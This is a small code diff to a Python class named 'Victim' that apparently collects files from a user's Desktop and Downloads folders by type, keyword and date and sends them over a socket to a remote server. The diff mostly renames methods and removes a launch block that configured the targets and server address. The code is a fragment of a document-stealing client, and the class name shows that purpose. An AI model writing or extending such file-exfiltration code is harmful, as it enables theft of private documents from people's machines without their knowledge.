@@ -12,7 +12,7 @@ class Victim(DocPuller, Protocol):
         DocPuller.__init__(self, directorys, file_types, key_words, date)
         Protocol.__init__(self, server, port)
         self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
+
     def _pull_files(self):
         while self._running or not self._pull_files_queue.empty():
             if not self._pull_files_queue.empty():
@@ -27,7 +27,7 @@ class Victim(DocPuller, Protocol):
                 self.send_file(self.victim, file_name, file_data)
         self._send_string(self.victim, self.DISCONNECT_MSG.encode())
 
-    def main(self):
+    def start(self):
         try:
             self.victim.connect(self.ADDR)
             self._main()
@@ -36,8 +36,5 @@ class Victim(DocPuller, Protocol):
         except Exception as e:
             print(e)
 
-
-if __name__ == '__main__':
-    Victim('localhost', 8830,
-           ('Desktop', 'Downloads'), ('.pdf', '.doc'), ('test', 'math'), {'2023': ('06', '05',)}
-           ).main()
+    def main(self):
+        self.start()
